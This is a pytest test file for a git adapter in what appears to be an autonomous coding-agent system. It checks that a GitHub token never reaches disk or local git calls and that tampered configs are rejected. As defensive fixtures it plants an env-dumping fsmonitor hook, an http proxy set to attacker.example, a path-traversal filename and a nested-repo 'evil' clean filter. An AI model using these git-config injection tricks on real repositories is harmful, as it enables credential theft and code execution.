"""SubprocessGit against a real bare remote: the PAT stays in process env, never on disk."""

from __future__ import annotations

import json
import stat
import subprocess
from pathlib import Path
from typing import Any
from unittest.mock import patch

import pytest

from sdlc_agents.coder import shell
from sdlc_agents.coder.git_adapter import NEUTRAL_AUTHOR, SubprocessGit, resolve_author
from sdlc_agents.ports import REPO, GitError

from .gitfixture import git as git_fixture
from .gitfixture import make_remote, remote_file, remote_log

PAT = "github_pat_SECRET0123456789abcdef"


@pytest.fixture
def cloned(tmp_path: Path) -> tuple[SubprocessGit, Path]:
    base = make_remote(tmp_path / "remote", {"app/src/a.ts": "a\n", "app/src/b.ts": "b\n", "README.md": "r\n"},
                       branches={"agent/existing": {"app/src/a.ts": "a2\n"}})
    git = SubprocessGit(author=NEUTRAL_AUTHOR, remote_base=base)
    dest = tmp_path / "checkout"
    git.clone(REPO, str(dest), token=PAT)
    return git, dest


def test_clone_keeps_the_token_out_of_the_checkout(cloned: tuple[SubprocessGit, Path]) -> None:
    git, dest = cloned
    for path in (dest / ".git").rglob("*"):
        if path.is_file():
            assert PAT.encode() not in path.read_bytes(), path
    assert "SECRET" not in git.run(["git", "remote", "-v"], timeout_s=10).output


def test_askpass_lives_under_the_configured_directory(tmp_path: Path) -> None:
    # A noexec /tmp cannot run the helper: git push failed with "cannot exec ... askpass" (live #121).
    where = tmp_path / "exec-ok"
    where.mkdir(mode=0o700)
    git = SubprocessGit(author=NEUTRAL_AUTHOR, askpass_dir=where)
    git._token = PAT
    seen: list[Path] = []

    def spy(cmd: list[str], **kwargs: Any) -> tuple[int, str, str]:
        seen.append(Path(kwargs["env"]["GIT_ASKPASS"]))
        return 0, "", ""

    with patch.object(shell, "capture", spy):
        git._git("push", "origin", cwd=tmp_path)
    assert seen[0].parent.parent == where
    assert not seen[0].parent.exists()    # still removed right after the call


def test_askpass_hands_the_token_to_git_only_for_network_calls(tmp_path: Path) -> None:
    git = SubprocessGit(author=NEUTRAL_AUTHOR)
    git._token = PAT
    seen: list[dict[str, str]] = []
    real_run = subprocess.run

    def spy(cmd: list[str], **kwargs: Any) -> tuple[int, str, str]:
        env = kwargs["env"]
        seen.append(dict(env))
        if "GIT_ASKPASS" in env:
            script = Path(env["GIT_ASKPASS"])
            assert stat.S_IMODE(script.stat().st_mode) == 0o700
            assert stat.S_IMODE(script.parent.stat().st_mode) == 0o700
            assert PAT not in script.read_text()
            user = real_run([str(script), "Username for 'https://github.com': "], env=env, capture_output=True,
                            text=True, check=True).stdout
            password = real_run([str(script), "Password for 'https://x-access-token@github.com': "], env=env,
                                capture_output=True, text=True, check=True).stdout
            assert (user, password) == ("x-access-token\n", f"{PAT}\n")
        return 0, "", ""

    with patch.object(shell, "capture", spy):
        git._git("status", cwd=tmp_path)
        git._git("ls-remote", "origin", cwd=tmp_path)
    local, network = seen
    assert "GIT_ASKPASS" not in local
    assert PAT not in json.dumps(local)
    assert network["GIT_TERMINAL_PROMPT"] == "0"
    assert not Path(network["GIT_ASKPASS"]).exists()                 # deleted right after the call
    assert not Path(network["GIT_ASKPASS"]).parent.exists()
    keys = {network[f"GIT_CONFIG_KEY_{i}"]: network[f"GIT_CONFIG_VALUE_{i}"]
            for i in range(int(network["GIT_CONFIG_COUNT"]))}
    assert keys["credential.helper"] == ""
    assert keys["core.fsmonitor"] == "false"
    assert not any("extraheader" in k for k in keys)


def test_branch_commit_push_and_history(cloned: tuple[SubprocessGit, Path], tmp_path: Path) -> None:
    git, _dest = cloned
    assert git.remote_has_branch("agent/existing")
    assert not git.remote_has_branch("agent/new")
    git.checkout_new_branch("agent/new", base="main")
    git.write_files({"app/tests/x.test.ts": "t\n"})
    assert git.changed_paths() == ["app/tests/x.test.ts"]
    sha = git.commit_all("test: add x")
    assert sha == git.head_sha()
    with pytest.raises(GitError, match="nothing to commit"):
        git.commit_all("feat: empty")
    git.push("agent/new")
    assert remote_log(tmp_path / "remote", "agent/new") == ["test: add x"]
    assert git.commits_since("main") == [(sha, "test: add x")]
    assert git.files_in_commit(sha) == ["app/tests/x.test.ts"]


def test_checkout_existing_branch_tracks_the_remote(cloned: tuple[SubprocessGit, Path], tmp_path: Path) -> None:
    git, dest = cloned
    git.checkout_existing_branch("agent/existing")
    assert (dest / "app/src/a.ts").read_text() == "a2\n"
    git.write_files({"app/src/a.ts": "a3\n"})
    git.commit_all("fix: a3")
    git.push("agent/existing")
    assert remote_file(tmp_path / "remote", "agent/existing", "app/src/a.ts") == "a3\n"


def test_revert_restores_modified_deleted_and_removes_new_files(cloned: tuple[SubprocessGit, Path]) -> None:
    git, dest = cloned
    (dest / "app/src/a.ts").write_text("changed\n")
    (dest / "app/src/b.ts").unlink()
    (dest / "evil").mkdir()
    (dest / "evil/new.ts").write_text("x")
    (dest / "README.md").rename(dest / "README2.md")
    changed = git.changed_paths()
    assert sorted(changed) == ["README.md", "README2.md", "app/src/a.ts", "app/src/b.ts", "evil/new.ts"]
    git.revert_paths(changed)
    assert git.changed_paths() == []
    assert (dest / "app/src/a.ts").read_text() == "a\n"
    assert (dest / "app/src/b.ts").exists()


def test_write_files_refuses_paths_outside_the_checkout(cloned: tuple[SubprocessGit, Path]) -> None:
    git, _ = cloned
    with pytest.raises(GitError, match="unsafe path"):
        git.write_files({"../escape.ts": "x"})


def test_git_failure_raises_with_the_command_output(tmp_path: Path) -> None:
    git = SubprocessGit(author=NEUTRAL_AUTHOR, remote_base=f"{(tmp_path / 'nowhere').as_uri()}/")
    with pytest.raises(GitError, match="git clone"):
        git.clone(REPO, str(tmp_path / "c"), token=PAT)


def test_author_uses_the_owner_noreply_only_with_a_user_id() -> None:
    assert resolve_author(None) == NEUTRAL_AUTHOR
    assert resolve_author(9320602) == ("foundry-autonomous-sdlc", "9320602+stevengonsalvez@users.noreply.github.com")


def test_local_git_commands_never_carry_the_token(cloned: tuple[SubprocessGit, Path], tmp_path: Path) -> None:
    git, dest = cloned
    spy = tmp_path / "spy.sh"
    dump = tmp_path / "dumped-env"
    spy.write_text(f"#!/bin/sh\nenv >> {dump}\n")
    spy.chmod(0o755)
    with open(dest / ".git/config", "a") as fh:     # what a prompt-injected engine could write
        fh.write(f"[core]\n\tfsmonitor = {spy}\n")
    (dest / "app/src/a.ts").write_text("changed\n")
    assert git.changed_paths() == ["app/src/a.ts"]
    git.changed_since(git.head_sha())
    leaked = dump.read_text() if dump.exists() else ""
    assert PAT not in leaked
    assert "extraheader" not in leaked


def test_network_commands_refuse_a_tampered_git_config(cloned: tuple[SubprocessGit, Path]) -> None:
    git, dest = cloned
    git.checkout_new_branch("agent/new", base="main")
    with open(dest / ".git/config", "a") as fh:
        fh.write("[http]\n\tproxy = http://attacker.example:8080\n")
    with pytest.raises(GitError, match=r"\.git/config changed"):
        git.push("agent/new")


def test_files_in_commit_handles_non_ascii_paths(cloned: tuple[SubprocessGit, Path]) -> None:
    git, _ = cloned
    git.checkout_new_branch("agent/new", base="main")
    git.write_files({"app/tests/café.test.ts": "x\n", "app/tests/with space.test.ts": "y\n"})
    sha = git.commit_all("test: unicode")
    assert sorted(git.files_in_commit(sha)) == ["app/tests/café.test.ts", "app/tests/with space.test.ts"]


def test_changes_since_a_sha_include_commits_the_engine_made(cloned: tuple[SubprocessGit, Path]) -> None:
    git, _ = cloned
    git.checkout_new_branch("agent/new", base="main")
    pre = git.head_sha()
    git.write_files({"app/src/a.ts": "engine\n", ".github/x.yml": "y\n"})
    git.commit_all("chore: sneaky")                 # an engine that ran git commit itself
    assert git.changed_paths() == []
    assert git.current_branch() == "agent/new"
    git.reset_soft(pre)
    assert git.head_sha() == pre
    assert sorted(git.changed_since(pre)) == [".github/x.yml", "app/src/a.ts"]
    git.revert_paths([".github/x.yml"])
    assert git.changed_since(pre) == ["app/src/a.ts"]


def test_clean_ignored_removes_only_ignored_files(cloned: tuple[SubprocessGit, Path]) -> None:
    git, dest = cloned
    (dest / ".gitignore").write_text("node_modules/\n")
    (dest / "app/node_modules").mkdir()
    (dest / "app/node_modules/hack.js").write_text("x")
    (dest / "app/src/new.ts").write_text("keep")
    git.clean_ignored("app")
    assert not (dest / "app/node_modules").exists()
    assert (dest / "app/src/new.ts").exists()


def test_write_files_refuses_a_symlinked_parent(cloned: tuple[SubprocessGit, Path], tmp_path: Path) -> None:
    git, dest = cloned
    outside = tmp_path / "outside"
    outside.mkdir()
    (dest / "app/tests").symlink_to(outside)
    with pytest.raises(GitError, match="unsafe path"):
        git.write_files({"app/tests/x.test.ts": "x"})
    assert list(outside.iterdir()) == []


def test_push_sends_exactly_the_verified_sha(cloned: tuple[SubprocessGit, Path], tmp_path: Path) -> None:
    git, _ = cloned
    git.checkout_new_branch("agent/new", base="main")
    git.write_files({"app/tests/x.test.ts": "x\n"})
    sha = git.commit_all("test: add x")
    git.push("agent/new", sha=sha)
    assert remote_log(tmp_path / "remote", "agent/new") == ["test: add x"]
    git.write_files({"app/tests/y.test.ts": "y\n"})
    git.commit_all("test: add y")
    with pytest.raises(GitError, match="HEAD moved"):
        git.push("agent/new", sha=sha)


def _nested_repo_with_filter(dest: Path, marker: Path) -> None:
    """What untrusted code can build in the tree: a repo whose own config runs a command as a clean filter."""
    inner = dest / "app/x"
    inner.mkdir(parents=True)
    git_fixture(inner, "init", "-q")
    (inner / "f.txt").write_text("data\n")
    (inner / ".gitattributes").write_text("* filter=evil\n")
    git_fixture(inner, "add", "-A")
    git_fixture(inner, "commit", "-q", "-m", "inner")
    with open(inner / ".git/config", "a") as fh:
        fh.write(f"[filter \"evil\"]\n\tclean = touch {marker}\n\tsmudge = cat\n")
    (inner / "f.txt").write_text("changed\n")


def test_root_git_never_runs_a_nested_repo_filter(cloned: tuple[SubprocessGit, Path], tmp_path: Path) -> None:
    git, dest = cloned
    git.checkout_new_branch("agent/new", base="main")
    pre = git.head_sha()
    marker = tmp_path / "PWNED"
    _nested_repo_with_filter(dest, marker)
    changed = git.changed_since(pre)
    git.changed_paths()
    assert git.special_paths_since(pre) == ["app/x"]          # a gitlink (mode 160000)
    assert "app/x" in changed
    git.commit_all("chore: gitlink")
    git.changed_paths()
    git.changed_since(pre)
    assert not marker.exists()
    assert git.special_paths_in_commit(git.head_sha()) == ["app/x"]


def test_staged_symlinks_are_special(cloned: tuple[SubprocessGit, Path]) -> None:
    git, dest = cloned
    pre = git.head_sha()
    (dest / "app/link").symlink_to("../README.md")
    git.changed_since(pre)
    assert git.special_paths_since(pre) == ["app/link"]
